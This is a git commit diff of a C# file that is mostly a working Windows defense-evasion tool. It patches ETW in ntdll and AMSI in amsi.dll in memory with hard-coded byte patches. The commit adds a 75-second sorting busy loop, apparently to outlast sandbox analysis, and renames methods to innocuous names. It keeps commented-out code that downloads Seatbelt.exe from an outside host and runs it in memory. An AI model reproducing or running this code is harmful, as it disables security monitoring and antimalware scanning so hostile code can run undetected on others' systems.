6d1222964b9cd3b19fab29a2d3ce97952cebab30
MemoryMeld <150578937+MemoryMeld@users.noreply.github.com>
2024-08-30 00:20:50 -0500

    Update test.cs

--- test.cs
+++ test.cs
@@ -1,17 +1,31 @@
 using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Net;
 using System.Reflection;
 using System.Runtime.InteropServices;
-using System.Net;
+using System.Text;
 
-namespace BypassETW
+namespace Code
 {
     public class Program
     {
-        // Byte arrays representing the patch code for x64 and the signature (egg) to search for in memory
-		// 0x48, 0x33, 0xC0   => XOR RAX, RAX      (Zeroes out the RAX register)
-		// 0xC3              => RET                 (Returns from the current function)
-        static byte[] patch_code_x64 = new byte[] { 0x48, 0x33, 0xC0, 0xC3 };
-        static byte[] egg_x64 = new byte[]
+        // AMSI Bypass specific patch and egg bytes
+        private static byte[] patch64 = new byte[] { 0xb8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+        private static byte[] egg64 = new byte[] {
+            0x4C, 0x8B, 0xDC,       // mov     r11,rsp
+            0x49, 0x89, 0x5B, 0x08, // mov     qword ptr [r11+8],rbx
+            0x49, 0x89, 0x6B, 0x10, // mov     qword ptr [r11+10h],rbp
+            0x49, 0x89, 0x73, 0x18, // mov     qword ptr [r11+18h],rsi
+            0x57,                   // push    rdi
+            0x41, 0x56,             // push    r14
+            0x41, 0x57,             // push    r15
+            0x48, 0x83, 0xEC, 0x70  // sub     rsp,70h
+        };
+
+        // ETW Bypass specific patch and egg bytes
+        private static byte[] patch_code_x64 = new byte[] { 0x48, 0x33, 0xC0, 0xC3 };
+        private static byte[] egg_x64 = new byte[]
         {
             0x4c, 0x8b, 0xdc,                           // mov     r11,rsp
             0x48, 0x83, 0xec, 0x58,                     // sub     rsp,58h
@@ -62,27 +76,101 @@ namespace BypassETW
             uint Newprotect;
 
             IntPtr libAddr = LoadLibrary(dllname);
+            if (libAddr == IntPtr.Zero)
+            {
+                Console.WriteLine("Failed to load DLL.");
+                return;
+            }
+
             IntPtr funcAddr = GetProcAddress(libAddr, funcname);
-            IntPtr PatchAddr = FindAddress(funcAddr, egg);
-            VirtualProtect(PatchAddr, (UIntPtr)patch.Length, 0x40, out Oldprotect);
-            Marshal.Copy(patch, 0, PatchAddr, patch.Length);
-            VirtualProtect(PatchAddr, (UIntPtr)patch.Length, Oldprotect, out Newprotect);
+            if (funcAddr == IntPtr.Zero)
+            {
+                Console.WriteLine("Failed to get function address.");
+                return;
+            }
+
+            IntPtr patchAddr = FindAddress(funcAddr, egg);
+
+            if (!VirtualProtect(patchAddr, (UIntPtr)patch.Length, 0x40, out Oldprotect))
+            {
+                Console.WriteLine("Failed to change memory protection.");
+                return;
+            }
+
+            Marshal.Copy(patch, 0, patchAddr, patch.Length);
+
+            if (!VirtualProtect(patchAddr, (UIntPtr)patch.Length, Oldprotect, out Newprotect))
+            {
+                Console.WriteLine("Failed to restore memory protection.");
+            }
         }
 
-        public static void StartPatch()
+        // AMSI patching method
+        private static void Scan()
+        {
+            MemoryPatch("amsi.dll", "DllCanUnloadNow", egg64, patch64);
+        }
+
+        // ETW patching method
+        private static void Etw()
         {
             MemoryPatch("ntdll.dll", "RtlInitializeResource", egg_x64, patch_code_x64);
         }
 
+        // Selection Sort Algorithm
+        private static void SelectionSort(int[] array)
+        {
+            int n = array.Length;
+            for (int i = 0; i < n - 1; i++)
+            {
+                int minIndex = i;
+                for (int j = i + 1; j < n; j++)
+                {
+                    if (array[j] < array[minIndex])
+                    {
+                        minIndex = j;
+                    }
+                }
+                int temp = array[minIndex];
+                array[minIndex] = array[i];
+                array[i] = temp;
+            }
+        }
+
         static void Main(string[] args)
         {
-            StartPatch();
-            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
-            var sb = Assembly.Load(new WebClient().DownloadData("https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe"));
-            sb.EntryPoint.Invoke(null, new object[] { new string[] {"" } });
-            Console.WriteLine(sb.FullName);
-            Console.WriteLine("Press any key to exit...");
-            Console.ReadKey();  // Waits for the user to press any key
+            // Create a large array of random integers
+            int arraySize = 100000;
+            int[] array = new int[arraySize];
+            Random rand = new Random();
+            for (int i = 0; i < arraySize; i++)
+            {
+                array[i] = rand.Next();
+            }
+
+            // Time the sorting operation
+            Stopwatch stopwatch = Stopwatch.StartNew();
+            while (stopwatch.Elapsed.TotalSeconds < 75)
+            {
+                SelectionSort(array);
+            }
+
+            Console.WriteLine("Selection sort completed after 75 seconds.");
+            
+            // Apply ETW patch
+            Etw();
+            // Apply AMSI patch
+            Scan();
+
+            // Load and execute external assembly
+            //ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+            //var sb = Assembly.Load(new WebClient().DownloadData("https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe"));
+            //sb.EntryPoint.Invoke(null, new object[] { new string[] {"" } });
+
+            // Output and wait for user input
+            //Console.WriteLine(sb.FullName);
+            //Console.WriteLine("Press any key to exit...");
+            //Console.ReadKey();
         }
     }
 }
